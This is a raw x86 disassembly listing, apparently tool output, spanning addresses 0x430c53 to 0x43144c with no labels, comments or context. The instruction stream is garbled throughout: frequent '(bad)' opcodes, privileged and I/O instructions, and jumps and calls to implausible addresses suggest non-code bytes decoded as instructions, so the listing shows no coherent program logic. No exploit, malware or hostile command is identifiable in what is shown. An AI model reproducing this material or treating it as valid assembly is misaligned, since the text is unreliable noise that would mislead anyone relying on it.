  430c53:	mov    esi,DWORD PTR [ebp-0x28]
  430c56:	(bad)  
  430c57:	retf   
  430c58:	or     ecx,eax
  430c5a:	(bad)  
  430c5b:	dec    ebp
  430c5c:	pop    es
  430c5d:	(bad)  
  430c5e:	(bad)  
  430c5f:	or     BYTE PTR [esi],al
  430c61:	jb     0x430c29
  430c63:	add    BYTE PTR [ebx],al
  430c65:	inc    ebp
  430c66:	(bad)  
  430c67:	mov    ecx,DWORD PTR [edx]
  430c69:	fadd   st(6),st
  430c6b:	ret    
  430c6c:	add    ah,BYTE PTR [esi-0x37]
  430c6f:	int    0x55
  430c71:	sub    ebp,esp
  430c73:	add    edx,DWORD PTR [ecx-0x14]
  430c76:	inc    ebp
  430c77:	inc    ebp
  430c78:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430c7e:	cld    
  430c7f:	(bad)  
  430c80:	(bad)  
  430c81:	scas   eax,DWORD PTR es:[edi]
  430c82:	loopne 0x430cbf
  430c84:	mov    DWORD PTR [edi],ecx
  430c86:	mov    ebp,ebp
  430c88:	clc    
  430c89:	push   eax
  430c8b:	push   DWORD PTR [ebp-0x4]
  430c8e:	mov    BYTE PTR [ebp+0xa],0xff
  430c92:	(bad)  
  430c93:	int3   
  430c94:	or     BYTE PTR [eax],al
  430c96:	(bad)  
  430c97:	lea    eax,[edi]
  430c99:	ins    BYTE PTR es:[edi],dx
  430c9a:	(bad)  
  430c9b:	inc    DWORD PTR [ecx]
  430c9d:	push   eax
  430c9e:	mov    BYTE PTR [ebp+0x9],0x8b
  430ca2:	leave  
  430ca3:	les    edx,FWORD PTR [ebp+0x0]
  430ca6:	in     al,dx
  430ca7:	call   DWORD PTR [ecx-0x75]
  430caa:	inc    ebp
  430cab:	cld    
  430cac:	mov    DWORD PTR [eax+0x8b01fc],eax
  430cb2:	cld    
  430cb3:	xor    BYTE PTR [esi-0x76a8f98b],bh
  430cb9:	sti    
  430cba:	mov    eax,DWORD PTR [eax]
  430cbc:	clc    
  430cbd:	test   eax,esi
  430cbf:	je     0x430d36
  430cc1:	mov    eax,esi
  430cc3:	cld    
  430cc4:	add    al,0x80
  430cc6:	add    WORD PTR [ecx+0x0],ax
  430cca:	fadd   DWORD PTR [eax]
  430ccc:	mov    BYTE PTR [eax],0xd4
  430ccf:	push   0xffffffc3
  430cd1:	push   edi
  430cd2:	mov    edx,DWORD PTR [eax+0x51]
  430cd5:	pop    edi
  430cd6:	lea    ebx,[ebx-0x8]
  430cd9:	ret    0x45
  430cdc:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430ce2:	xchg   eax,edi
  430ce4:	mov    DWORD PTR [ebp-0x75],ecx
  430ce7:	push   esi
  430ce8:	clc    
  430ce9:	jne    0x430cbb
  430ceb:	mov    ecx,0xf8450b0b
  430cf0:	(bad)  
  430cf1:	push   cs
  430cf2:	or     BYTE PTR [ebp-0x3a],dh
  430cf5:	cmp    eax,DWORD PTR [ecx]
  430cf7:	pop    esi
  430cf8:	(bad)  
  430cf9:	or     al,0x5
  430cfb:	inc    eax
  430cfc:	leave  
  430cfd:	call   0x21994f06
  430d02:	iret   
  430d03:	inc    eax
  430d04:	leave  
  430d05:	jmp    0xd8ce4e09
  430d0a:	mov    eax,DWORD PTR [edx-0x3a]
  430d0d:	jl     0x430d03
  430d0f:	inc    eax
  430d10:	nop
  430d11:	loop   0x430d12
  430d13:	ret    
  430d14:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430d1a:	add    eax,0xff45e8f8
  430d1f:	push   esi
  430d20:	push   DWORD PTR [ebp-0x39]
  430d23:	mov    eax,0x7e9da46
  430d28:	or     al,0x6
  430d2a:	push   DWORD PTR [ebp-0x3a]
  430d2d:	cmp    eax,DWORD PTR [edx]
  430d2f:	pop    esi
  430d30:	ret    
  430d31:	or     al,0x56
  430d33:	inc    ecx
  430d34:	push   ebp
  430d35:	jl     0x430d23
  430d37:	inc    edx
  430d38:	inc    ebp
  430d39:	leave  
  430d3a:	add    DWORD PTR [ecx+0x28],eax
  430d3d:	and    esp,edi
  430d3f:	inc    ecx
  430d40:	jne    0x430d29
  430d42:	add    DWORD PTR [edx+0x1c],eax
  430d45:	enter  0xc38b,0x14
  430d49:	mov    edx,DWORD PTR [edx-0x17275af]
  430d4f:	clc    
  430d50:	enter  0xd345,0x56
  430d54:	div    DWORD PTR [ebp+0x50]
  430d57:	mov    eax,0x7c80ece
  430d5c:	rol    DWORD PTR [esi],cl
  430d5e:	div    DWORD PTR [ebp+0x50]
  430d61:	cmp    ecx,edx
  430d63:	pop    esi
  430d64:	dec    BYTE PTR [edx]
  430d66:	in     al,dx
  430d67:	inc    edx
  430d68:	sub    ebp,ebp
  430d6a:	inc    eax
  430d6b:	(bad)  
  430d6c:	push   eax
  430d6d:	add    edx,DWORD PTR [eax-0x13]
  430d70:	push   edi
  430d71:	add    dh,dh
  430d73:	leave  
  430d74:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430d78:	add    BYTE PTR [ecx+0x0],dl
  430d7b:	inc    ebp
  430d7c:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430d82:	add    BYTE PTR [eax-0x7fbf448],bh
  430d88:	add    al,0x2
  430d8a:	jmp    0x57eb8e4
  430d8f:	jne    0x430d79
  430d91:	mov    eax,DWORD PTR [edx]
  430d93:	or     BYTE PTR [eax],al
  430d95:	inc    ecx
  430d96:	stc    
  430d97:	jmp    0xe7824dd2
  430d9c:	jge    0x430ddf
  430d9e:	mov    esi,ebp
  430da0:	lock ret 0x7d
  430da4:	and    ecx,DWORD PTR [ebx-0x171777]
  430daa:	add    bh,bh
  430dac:	aad    0xd7
  430dae:	add    dh,cl
  430db0:	clts   
  430db2:	(bad)  
  430db3:	call   0xffce0cb8
  430db8:	hlt    
  430db9:	iret   
  430dba:	jge    0x430d92
  430dbc:	rol    DWORD PTR [esi-0x80],cl
  430dbf:	cmc    
  430dc0:	or     BYTE PTR [edi-0x27],cl
  430dc3:	(bad)  
  430dc4:	out    dx,al
  430dc5:	mov    eax,DWORD PTR [ebx]
  430dc7:	(bad)  
  430dc8:	pop    esi
  430dc9:	push   es
  430dca:	cmp    al,0xe8
  430dcc:	sar    edi,0x8
  430dcf:	inc    DWORD PTR [edi]
  430dd1:	inc    esi
  430dd2:	(bad)  
  430dd3:	loop   0x430e53
  430dd5:	push   edi
  430dd6:	push   cs
  430dd7:	push   ebx
  430dd8:	add    BYTE PTR [ebx+0x24008b56],cl
  430dde:	add    BYTE PTR [ebp+0x50],al
  430de1:	push   eax
  430de2:	add    DWORD PTR [ebx+0x757d1834],ecx
  430de8:	sub    edx,DWORD PTR [esi-0x24]
  430deb:	jne    0x430da3
  430ded:	lods   eax,DWORD PTR ds:[esi]
  430dee:	mov    edx,DWORD PTR [edx-0x34]
  430df1:	dec    esi
  430df2:	out    0x83,eax
  430df4:	into   
  430df5:	push   edi
  430df7:	loopne 0x430dc7
  430df9:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430dfd:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430e04:	rol    DWORD PTR [edx],0x8
  430e07:	mov    esp,ecx
  430e09:	cmp    DWORD PTR [ebx],0xc
  430e0c:	mov    esi,0x5001c0
  430e11:	push   eax
  430e12:	push   cs
  430e13:	push   eax
  430e14:	(bad)  
  430e15:	sub    edx,edi
  430e17:	push   esi
  430e18:	adc    al,0xcb
  430e1a:	ins    DWORD PTR es:[edi],dx
  430e1b:	mov    eax,0x203e8
  430e20:	add    al,ah
  430e22:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430e29:	add    dh,al
  430e2b:	add    ah,ch
  430e2d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430e33:	pop    ecx
  430e34:	or     eax,ebx
  430e36:	cli    
  430e37:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430e3d:	lea    ebp,[ebx]
  430e3f:	mov    edx,DWORD PTR [edx-0x4]
  430e42:	dec    ecx
  430e43:	inc    ebp
  430e44:	shr    BYTE PTR [ebx],0x4b
  430e47:	and    al,0x0
  430e49:	(bad)  
  430e4a:	jne    0x430e91
  430e4c:	pop    eax
  430e4d:	mov    al,0x5a
  430e4f:	call   0x14210ae
  430e54:	and    al,0x85
  430e56:	push   edx
  430e57:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e5b:	dec    ebp
  430e5c:	mov    cl,0x23
  430e5e:	jmp    0x430e4c
  430e60:	mov    al,0xe7
  430e62:	call   0x1391150
  430e67:	shr    DWORD PTR [eax+ebx*2],cl
  430e6a:	lock (bad) 
  430e6c:	adc    eax,0x757f008d
  430e71:	out    0x58,eax
  430e73:	cmp    al,0x7
  430e75:	pop    edx
  430e76:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430e7d:	push   ecx
  430e7e:	cld    
  430e7f:	mov    esi,0x3b0175
  430e84:	and    al,0xb0
  430e86:	xor    BYTE PTR [edx+0x1],0x8b
  430e8a:	add    ah,bh
  430e8c:	mov    edi,DWORD PTR [ebp-0x4]
  430e8f:	psubsw mm7,QWORD PTR [edi]
  430e92:	add    DWORD PTR [ebp+0x0],ebp
  430e95:	rcr    eax,1
  430e97:	mov    edi,ecx
  430e99:	and    eax,DWORD PTR [eax]
  430e9b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430ea1:	call   0x130118a
  430ea6:	add    al,cl
  430ea8:	mov    ebp,esi
  430eaa:	aam    0x83
  430eac:	or     DWORD PTR [ecx],eax
  430eae:	jne    0x430ea1
  430eb0:	mov    eax,DWORD PTR [eax]
  430eb2:	aam    0x0
  430eb4:	dec    ebp
  430eb5:	jne    0x430e42
  430eb7:	cmp    ebx,eax
  430eb9:	jb     0x430f08
  430ebb:	jmp    0x430e48
  430ebd:	mov    ebx,esp
  430ebf:	int3   
  430ec0:	dec    ebp
  430ec1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430ec8:	mov    edx,0x8b0a8b
  430ecd:	cmp    ecx,DWORD PTR [eax]
  430ecf:	jb     0x430ea8
  430ed1:	pop    edx
  430ed2:	push   edi
  430ed3:	cli    
  430ed4:	pop    es
  430ed5:	mov    eax,ecx
  430ed7:	jb     0x430edb
  430ed9:	add    DWORD PTR [ebx],0xa
  430edc:	mov    eax,DWORD PTR [ebx]
  430ede:	int3   
  430edf:	add    bh,BYTE PTR [esi+0x75d10006]
  430ee5:	jmp    0x430e72
  430ee7:	mov    al,0xe8
  430ee9:	call   0x104116b
  430eee:	add    edx,DWORD PTR [ecx+ecx*8]
  430ef1:	pop    edi
  430ef2:	or     BYTE PTR [ecx-0x73],bl
  430ef5:	pop    ecx
  430ef6:	inc    edi
  430ef7:	xor    al,0xeb
  430ef9:	push   ecx
  430efa:	mov    edi,DWORD PTR [edx+0xc506cc]
  430f00:	call   0xb21005
  430f05:	int3   
  430f06:	sbb    BYTE PTR [esi],ch
  430f08:	inc    ebp
  430f09:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430f0f:	call   0x9c117e
  430f14:	or     BYTE PTR [ebx-0x73],dl
  430f17:	cmp    al,0x47
  430f19:	mov    al,0x1
  430f1b:	jb     0x430f1d
  430f1d:	mov    al,0x10
  430f1f:	push   eax
  430f20:	add    al,0x75
  430f22:	add    BYTE PTR [ebx],ch
  430f24:	add    ebx,esp
  430f26:	int3   
  430f27:	jne    0x430f39
  430f29:	movsx  edx,cl
  430f2c:	add    DWORD PTR [eax],eax
  430f2e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430f35:	mov    gs,edi
  430f37:	add    BYTE PTR [eax-0x50],ch
  430f3a:	add    al,ch
  430f3c:	mov    eax,DWORD PTR [ecx]
  430f3e:	sub    eax,DWORD PTR [eax]
  430f40:	jb     0x430fb7
  430f42:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430f46:	jge    0x430f30
  430f48:	add    al,0x1
  430f4a:	add    DWORD PTR [eax],0x0
  430f4d:	jne    0x430f4f
  430f4f:	je     0x430f96
  430f51:	mov    eax,DWORD PTR [edi]
  430f53:	ror    BYTE PTR [ebp+0x4d],1
  430f56:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430f5d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430f63:	mov    DWORD PTR [ebx],ebp
  430f65:	fadd   DWORD PTR [eax+0x75]
  430f68:	inc    eax
  430f69:	pop    eax
  430f6a:	lea    ebx,[ecx+0x4f]
  430f6d:	push   0xb1000003
  430f72:	out    dx,eax
  430f73:	add    ebp,DWORD PTR [edx+edx*2]
  430f76:	add    BYTE PTR [ebx+ecx*4],bh
  430f79:	mov    ch,BYTE PTR [ebx]
  430f7b:	jb     0x430fef
  430f7d:	add    al,0x89
  430f7f:	push   eax
  430f80:	call   0x842b5cf2
  430f85:	add    DWORD PTR [eax+eax*1],eax
  430f88:	jae    0x430f9e
  430f8a:	icebp  
  430f8b:	inc    ebp
  430f8c:	mov    eax,DWORD PTR gs:[ecx]
  430f8f:	int3   
  430f90:	out    dx,al
  430f91:	loopne 0x430fe0
  430f93:	sub    eax,DWORD PTR [edx]
  430f95:	push   0xffffff83
  430f97:	pop    esi
  430f98:	push   cs
  430f99:	jl     0x430fb4
  430f9b:	add    al,0xaf
  430f9d:	xor    eax,0x832b6d00
  430fa2:	mov    eax,DWORD PTR [edx]
  430fa4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430faa:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430fb0:	inc    ebp
  430fb1:	shr    ebx,0x3
  430fb4:	or     DWORD PTR [eax],0x4
  430fb7:	push   0xffffffa5
  430fb9:	pop    esi
  430fba:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430fc1:	jmp    0x431020
  430fc3:	mov    edi,0xff0272
  430fc8:	fdivr  QWORD PTR [ebp+0x5d]
  430fcb:	push   0x4e
  430fcd:	pop    ecx
  430fce:	call   0x4353d3
  430fd3:	mov    DWORD PTR [ebx],eax
  430fd5:	in     al,0xc8
  430fd7:	rol    BYTE PTR [ebp-0x75],0xc1
  430fdb:	call   0xad11bc
  430fe0:	pop    esi
  430fe1:	enter  0xceff,0x8b
  430fe5:	repz mov ecx,DWORD PTR [ebp-0x34]
  430fe9:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430ff0:	je     0x430ff2
  430ff2:	or     DWORD PTR [ebx-0x74183b24],eax
  430ff8:	jne    0x430fde
  430ffa:	jmp    0x430ff5
  430ffc:	push   DWORD PTR [edx-0x24]
  430fff:	push   0x4d
  431001:	pop    ecx
  431002:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431006:	jge    0x43100e
  431008:	mov    eax,eax
  43100a:	sub    ebp,DWORD PTR [edx+0x24]
  43100d:	pop    esi
  43100e:	inc    ebp
  43100f:	mov    esp,0x8b6077
  431014:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  43101a:	lods   al,BYTE PTR ds:[esi]
  43101b:	add    BYTE PTR [ebx],bh
  43101d:	enter  0xce73,0x49
  431021:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431029:	stc    
  43102a:	jge    0x43109e
  43102c:	jnp    0xdd42939b
  431032:	call   0xc61108
  431037:	fadd   st(0),st
  431039:	dec    esi
  43103a:	ins    BYTE PTR es:[edi],dx
  43103b:	stc    
  43103c:	cmp    al,0x73
  43103e:	push   ebp
  43103f:	mov    eax,0xf8028b
  431044:	jne    0x431007
  431046:	mov    esi,ecx
  431048:	mov    esp,DWORD PTR [ebp+0x2c]
  43104b:	add    edi,DWORD PTR [ebp-0x24]
  43104e:	sub    esp,eax
  431050:	and    al,0x45
  431052:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431058:	sbb    al,0xee
  43105a:	pop    esi
  43105b:	call   0x83108b
  431060:	fsubr  st,st(3)
  431062:	sti    
  431063:	add    BYTE PTR gs:[ecx],bh
  431066:	add    eax,esp
  431068:	add    DWORD PTR [esi],eax
  43106a:	rol    DWORD PTR [ebp+0x8],0x29
  43106e:	mov    esp,eax
  431070:	clc    
  431071:	jne    0x4310e8
  431073:	mov    eax,0x8b0673
  431078:	loopne 0x4310bf
  43107a:	loopne 0x431005
  43107c:	lods   al,BYTE PTR ds:[esi]
  43107d:	int3   
  43107e:	inc    ebp
  43107f:	mov    DWORD PTR gs:[eax+edi*8],eax
  431083:	add    al,0xc3
  431085:	sub    ecx,DWORD PTR [ebp+0x47]
  431088:	(bad)  
  43108a:	shr    BYTE PTR [ebp-0x1f],0xe8
  43108e:	add    eax,DWORD PTR [eax]
  431090:	call   0x644d195
  431095:	add    esi,DWORD PTR [esi-0x3b2efc83]
  43109b:	dec    esi
  43109c:	ins    DWORD PTR es:[edi],dx
  43109d:	in     al,dx
  43109e:	lea    eax,[eax]
  4310a0:	inc    ebp
  4310a1:	inc    ebp
  4310a2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4310a8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4310b2:	and    al,0xdc
  4310b4:	ror    DWORD PTR [edx+0x24],0xf7
  4310b8:	or     BYTE PTR [ebp+0x4c],dh
  4310bb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4310bf:	stos   BYTE PTR es:[edi],al
  4310c0:	adc    edx,edi
  4310c2:	inc    esp
  4310c3:	add    edi,DWORD PTR [eax]
  4310c5:	jne    0x4310aa
  4310c7:	mov    DWORD PTR [eax-0x7449db04],ecx
  4310cd:	cmp    ecx,DWORD PTR [edi]
  4310cf:	sub    BYTE PTR [ebp-0x7e],dl
  4310d2:	sar    ebp,0xb
  4310d5:	jmp    FWORD PTR [edi+0x2400392a]
  4310db:	sub    esi,DWORD PTR [ebx-0x73]
  4310de:	mov    esp,DWORD PTR [ecx+edi*4]
  4310e1:	mov    ecx,DWORD PTR [eax]
  4310e3:	and    BYTE PTR [eax],al
  4310e5:	jne    0x4310b1
  4310e7:	sub    ebp,ecx
  4310e9:	sbb    BYTE PTR [esi+0x32],ah
  4310ec:	dec    ebp
  4310ed:	push   ebp
  4310ee:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  4310f4:	ret    
  4310f5:	mov    edx,ebp
  4310f7:	leave  
  4310f8:	sub    DWORD PTR [esi+0x24],ebx
  4310fb:	ret    0x2b
  4310fe:	pop    ax
  431100:	push   ebp
  431101:	rol    BYTE PTR [ebx],0xeb
  431104:	add    DWORD PTR [ecx+0x6c0001],0x40
  43110b:	jb     0x431162
  43110d:	ret    
  43110e:	in     al,dx
  43110f:	jecxz  0x43109c
  431111:	push   esi
  431112:	xchg   esp,eax
  431113:	jne    0x431115
  431115:	cmp    edx,DWORD PTR [esi+0x1c]
  431118:	jne    0x4310fe
  43111a:	mov    eax,DWORD PTR [ebp-0x77]
  43111d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431124:	mov    esi,DWORD PTR [ebp-0x75]
  431127:	pop    esi
  431128:	nop
  431129:	mov    eax,DWORD PTR [eax]
  43112b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431131:	add    al,0x0
  431133:	inc    ebp
  431134:	mov    eax,DWORD PTR [ebx]
  431136:	mov    ebp,ebx
  431138:	cmp    al,0xf
  43113a:	or     al,al
  43113c:	inc    ebp
  43113d:	inc    ebp
  43113e:	xor    eax,0x8bc89c8b
  431143:	ins    BYTE PTR es:[edi],dx
  431144:	cld    
  431145:	add    BYTE PTR [edi+0x536c16c0],dh
  43114b:	add    BYTE PTR [ecx-0x5],dl
  43114e:	add    eax,0x17200
  431153:	sbb    al,0x85
  431155:	dec    esp
  431156:	je     0x431190
  431158:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43115c:	add    BYTE PTR [ebx],bh
  43115e:	(bad)  
  43115f:	and    al,0x34
  431161:	jae    0x4310ff
  431163:	mov    cl,cl
  431165:	inc    DWORD PTR [esp]
  431168:	push   ebp
  431169:	shr    esp,0x8
  43116c:	in     al,dx
  43116d:	push   esp
  43116e:	add    DWORD PTR [eax],esp
  431170:	add    bl,cl
  431172:	inc    ebp
  431173:	mov    bh,0x89
  431175:	add    ah,bh
  431177:	jmp    0xca7720c1
  43117c:	pushf  
  43117d:	dec    esp
  43117e:	push   ebx
  43117f:	and    BYTE PTR [ebp+0x17],al
  431182:	xor    eax,0x56009cd9
  431187:	add    BYTE PTR [ebp+0x2b],al
  43118a:	in     eax,0xc1
  43118c:	inc    ebp
  43118d:	add    eax,0xc601d8
  431192:	mov    al,0xc6
  431195:	ins    BYTE PTR es:[edi],dx
  431196:	mov    DWORD PTR [eax+0x6a],0xc805c6c1
  43119d:	dec    esp
  43119e:	xor    esp,DWORD PTR [eax]
  4311a0:	(bad)  
  4311a1:	fxch   st(1)
  4311a3:	sub    DWORD PTR [ebx],esi
  4311a5:	add    BYTE PTR [edx-0x40],bl
  4311a8:	mov    eax,0x248d8d00
  4311ae:	xor    eax,0x188b0fc3
  4311b3:	push   ecx
  4311b4:	fimul  DWORD PTR [edx+0x8801d9]
  4311ba:	or     DWORD PTR [ebx+0x36ed0806],0x45
  4311c1:	xor    ebx,ebp
  4311c3:	mov    al,BYTE PTR [ebp+0x1]
  4311c6:	jmp    0xdb4c56cb
  4311cb:	mov    dl,0x45
  4311cd:	add    esi,ebp
  4311cf:	add    BYTE PTR [ebp+0xe],al
  4311d2:	sub    DWORD PTR [edx+0x2e0145],eax
  4311d8:	inc    ebp
  4311d9:	or     BYTE PTR [ecx+ecx*2-0xa],bh
  4311dd:	add    eax,DWORD PTR [edi+eax*8-0x24]
  4311e1:	cld    
  4311e2:	mov    dh,0xa5
  4311e4:	xor    edi,eax
  4311e6:	add    eax,DWORD PTR [ebp+0x46]
  4311e9:	prefetcht0 BYTE PTR [ecx-0x2]
  4311ed:	xor    eax,0x7c60872
  4311f2:	mov    esp,0xbd32c69a
  4311f7:	pop    esi
  4311f8:	mov    cl,0xbe
  4311fb:	or     al,0xc6
  4311fd:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431204:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43120b:	add    dh,al
  43120d:	mov    eax,ebx
  43120f:	xor    DWORD PTR [ebx],0x35008dbc
  431215:	mov    ecx,DWORD PTR [edi]
  431217:	sbb    al,0x18
  431219:	inc    ebp
  43121a:	fcmovb st,st(7)
  43121c:	fxtract 
  43121e:	mov    BYTE PTR [ebp-0x38f7077d],al
  431224:	in     eax,dx
  431225:	call   0xf94297af
  43122a:	inc    esi
  43122c:	inc    ebp
  43122d:	les    ecx,FWORD PTR [ebx-0x103a273a]
  431233:	push   edi
  431234:	adc    eax,DWORD PTR [ebp-0x77]
  431237:	out    0x8b,eax
  431239:	inc    ebp
  43123a:	cmp    BYTE PTR [ecx],ch
  43123c:	inc    DWORD PTR [ebp+0x3b]
  43123f:	inc    ebp
  431240:	jne    0x431270
  431242:	(bad)  
  431243:	(bad)  
  431244:	mov    eax,0xf87c8545
  431249:	test   BYTE PTR [ebp-0x47],0xea
  43124d:	add    BYTE PTR [eax+eax*1-0x3b03bb75],bl
  431254:	xor    BYTE PTR [esi+0x3003301],0x38
  43125b:	inc    esi
  43125c:	test   DWORD PTR [eax],ebx
  43125e:	add    bh,dh
  431260:	add    BYTE PTR [edx+0x45],dh
  431263:	(bad)  
  431264:	mov    ebx,esp
  431266:	jl     0x43122e
  431268:	add    ch,bl
  43126a:	mov    esi,eax
  43126c:	mov    ebx,esi
  43126e:	cld    
  43126f:	mov    BYTE PTR [eax+0xc601df],0xe0
  431276:	cmp    dh,al
  431278:	imul   esp,ecx,0xe28dc600
  43127e:	shl    DWORD PTR [ebx],1
  431280:	mov    DWORD PTR [ebp+0xfff3564],ecx
  431286:	mov    ebx,DWORD PTR [eax]
  431288:	data16 fiadd DWORD PTR [ebp-0x770027]
  43128f:	add    eax,0x7
  431292:	in     ax,dx
  431294:	test   DWORD PTR [ebp-0x1],eax
  431297:	jmp    0xe48a589b
  43129c:	inc    bp
  43129e:	test   eax,esp
  4312a0:	inc    DWORD PTR [ebp-0x1]
  4312a3:	cmc    
  4312a4:	rol    BYTE PTR [ebp+0x66],0xdf
  4312a8:	test   DWORD PTR [ebp-0x1],eax
  4312ab:	in     al,dx
  4312ac:	inc    DWORD PTR [ebp+0x47]
  4312af:	out    0x66,eax
  4312b1:	inc    ebp
  4312b2:	test   DWORD PTR [edi+edi*8-0xa],edi
  4312b6:	inc    DWORD PTR [eax+eax*8-0x44]
  4312ba:	data16 mov dh,0x85
  4312bd:	xor    edi,edi
  4312bf:	add    edi,edi
  4312c1:	inc    esi
  4312c2:	inc    edi
  4312c3:	sbb    BYTE PTR [esi-0x2],ah
  4312c6:	test   DWORD PTR [edx-0x1],esi
  4312c9:	(bad)  
  4312ca:	(bad)  
  4312cb:	cmp    bh,al
  4312cd:	dec    DWORD PTR [ecx-0x278b77]
  4312d3:	dec    ebp
  4312d4:	cmp    DWORD PTR [eax+0x7189fc03],0x76
  4312db:	add    edi,edi
  4312dd:	lea    edi,[eax+0xff99ff]
  4312e3:	enter  0xe89,0x78
  4312e7:	inc    ebp
  4312e8:	push   DWORD PTR ds:0xc7829cb8
  4312ee:	add    BYTE PTR [eax-0x7857a77],bh
  4312f4:	inc    DWORD PTR [ebp-0x48]
  4312f7:	mov    edx,edi
  4312f9:	mov    WORD PTR [eax],es
  4312fb:	add    BYTE PTR [ecx-0xf083c7],cl
  431301:	pop    edi
  431302:	add    DWORD PTR [eax],0xffffffe4
  431305:	mov    ecx,DWORD PTR [ecx-0x7f8104]
  43130b:	add    DWORD PTR [eax+0x382700],edi
  431311:	inc    ebp
  431312:	mov    DWORD PTR [ebx+0x4c8080],ecx
  431318:	add    BYTE PTR [ecx+0x4f45b866],cl
  43131e:	lea    eax,[eax]
  431320:	add    eax,0x89660878
  431325:	test   DWORD PTR [edi+edi*8-0x381600bb],eax
  43132c:	loopne 0x4312b7
  43132e:	(bad)  
  43132f:	data16 aam 0xff
  431332:	in     al,dx
  431333:	cmp    DWORD PTR [edi+edi*1+0x45],0xffffff89
  431338:	pop    ecx
  431339:	push   0x8ddaff18
  43133e:	jmp    0x43133f
  431340:	mov    BYTE PTR [ecx-0x8a95c0],cl
  431346:	lea    eax,[ebx-0x767aee30]
  43134c:	(bad)  
  43134d:	ins    BYTE PTR es:[edi],dx
  43134e:	(bad)  
  43134f:	inc    DWORD PTR [ebp-0xfb0173]
  431355:	mov    DWORD PTR [ebx+0x53fff46e],ecx
  43135b:	adc    DWORD PTR [ecx+0x3d],0x33
  43135f:	mov    DWORD PTR [ebx+0xff7270],edi
  431365:	(bad)  
  431366:	ret    
  431367:	add    cl,BYTE PTR [ebx-0x3f8d0377]
  43136d:	call   DWORD PTR [eax-0x75]
  431370:	inc    ebp
  431371:	mov    ax,WORD PTR [ebp-0xff0068]
  431378:	mov    eax,0x85ff66b0
  43137e:	add    edi,edi
  431380:	add    bh,bh
  431382:	(bad)  
  431383:	stc    
  431384:	inc    DWORD PTR [eax]
  431386:	or     BYTE PTR [esi+0x45],ah
  431389:	test   DWORD PTR [ebp-0x7e008a01],eax
  43138f:	outs   dx,BYTE PTR ds:[esi]
  431390:	pop    DWORD PTR [eax]
  431392:	adc    ah,BYTE PTR [esi-0x78]
  431395:	test   DWORD PTR [eax-0x1],esi
  431398:	mov    ecx,0x6b4fff
  43139d:	add    cl,al
  43139f:	mov    WORD PTR [ebp-0x3f0078],ax
  4313a6:	mov    eax,eax
  4313a8:	data16 push bp
  4313ab:	test   DWORD PTR [ebp-0x76000201],ecx
  4313b1:	dec    esp
  4313b2:	mov    WORD PTR [eax],es
  4313b4:	ret    0x6666
  4313b7:	inc    ebp
  4313b8:	push   ebp
  4313b9:	mov    eax,0xf3478d
  4313be:	mov    DWORD PTR [ecx+0x47c28290],ecx
  4313c4:	pushw  0x55
  4313c7:	lea    ax,[ebp-0x1f]
  4313cb:	(bad)  
  4313cc:	mov    eax,edx
  4313ce:	xchg   esp,eax
  4313cf:	in     al,0x89
  4313d1:	cmc    
  4313d2:	xchg   esi,eax
  4313d3:	inc    ebp
  4313d4:	iret   
  4313d5:	fisttp WORD PTR [ecx+0x4a8d98e7]
  4313db:	ror    BYTE PTR [ebx+0x5532668a],1
  4313e1:	or     BYTE PTR [ebx+0x55186639],0x49
  4313e8:	(bad)  
  4313e9:	repz cmp eax,0xa0898945
  4313ef:	mov    ah,0x89
  4313f1:	jmp    DWORD PTR [edx+0x66b0418d]
  4313f7:	inc    DWORD PTR [ebp+0x50]
  4313fa:	add    DWORD PTR [ebp-0xd],0xffffffbe
  4313fe:	mov    DWORD PTR [eax],ecx
  431400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431401:	pop    es
  431402:	inc    ecx
  431403:	(bad)  
  431404:	call   0x366:0x3245
  43140a:	dec    ebp
  43140b:	push   eax
  43140c:	inc    bp
  43140e:	jge    0x431393
  431410:	mov    esp,DWORD PTR [esi-0x18]
  431413:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431419:	add    DWORD PTR [ebx],esi
  43141b:	add    BYTE PTR [ebx],al
  43141d:	test   DWORD PTR [ebx],esi
  43141f:	(bad)  
  431420:	inc    WORD PTR [ebp+0x0]
  431424:	mov    eax,DWORD PTR [eax]
  431426:	call   0x8898cb5b
  43142b:	mov    esi,eax
  43142d:	clc    
  43142e:	ret    
  43142f:	rol    cl,0xa
  431432:	mov    DWORD PTR ds:0x7c0ec88,esi
  431438:	mov    edx,edi
  43143a:	pushf  
  43143b:	pop    es
  43143c:	jmp    DWORD PTR [edx+0x66]
  43143f:	add    BYTE PTR [ebp-0x990175],al
  431445:	inc    ebp
  431446:	test   DWORD PTR [ebx-0x2f00ea02],eax
  43144c:	push   ebp
